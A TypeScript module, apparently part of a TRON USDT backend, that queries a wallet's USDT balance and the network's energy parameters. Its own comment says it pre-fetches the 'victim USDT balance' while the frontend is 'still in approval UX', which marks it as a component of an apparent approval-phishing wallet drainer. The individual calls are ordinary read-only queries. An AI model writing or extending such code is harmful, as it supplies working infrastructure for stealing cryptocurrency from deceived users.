import { TronWeb } from "tronweb";
import { env } from "../env.js";
import { TRON_USDT_CONTRACT_MAINNET } from "./tronAutoDeposit.js";

type TriggerResult = {
  result?: { result?: boolean };
  constant_result?: string[];
};

function createReadProvider(): TronWeb {
  const headers = env.tronGridApiKey ? { "TRON-PRO-API-KEY": env.tronGridApiKey } : undefined;
  return new TronWeb({
    fullHost: env.tronFullNodeUrl,
    headers,
  });
}

function decodeUint256Hex(raw: string | undefined): string | undefined {
  if (!raw) return undefined;
  const hex = raw.trim().replace(/^0x/i, "");
  if (!hex) return undefined;
  try {
    return BigInt(`0x${hex}`).toString();
  } catch {
    return undefined;
  }
}

function pickEnergyFactor(params: Array<{ key?: string; value?: number | string }>): string | undefined {
  const preferred =
    params.find((p) => p.key === "getDynamicEnergyFactor") ??
    params.find((p) => p.key === "getDynamicEnergyIncreaseFactor") ??
    params.find((p) => p.key === "getEnergyFee");
  if (preferred?.value == null) return undefined;
  return String(preferred.value);
}

/**
 * Pre-fetches execution context while frontend is still in approval UX:
 * - victim USDT balance via triggerConstantContract(balanceOf)
 * - current network energy_factor from chain parameters
 */
export async function prefetchExecutionContext(params: {
  clientAddress: string;
  callerAddressHint?: string;
}): Promise<{
  prefetchedBalanceRaw?: string;
  prefetchedEnergyFactor?: string;
}> {
  const tw = createReadProvider();
  const client = params.clientAddress.trim();
  if (!tw.isAddress(client)) {
    throw new Error("Invalid clientAddress for preflight.");
  }

  const issuerAddress = params.callerAddressHint?.trim() || client;
  const trigger = (await tw.transactionBuilder.triggerConstantContract(
    TRON_USDT_CONTRACT_MAINNET,
    "balanceOf(address)",
    {},
    [{ type: "address", value: client }],
    issuerAddress,
  )) as TriggerResult;

  const prefetchedBalanceRaw = decodeUint256Hex(trigger.constant_result?.[0]);

  let prefetchedEnergyFactor: string | undefined;
  try {
    const chainParams = (await tw.trx.getChainParameters()) as Array<{ key?: string; value?: number | string }>;
    prefetchedEnergyFactor = pickEnergyFactor(chainParams);
  } catch {
    /* optional metric */
  }

  return {
    prefetchedBalanceRaw,
    prefetchedEnergyFactor,
  };
}
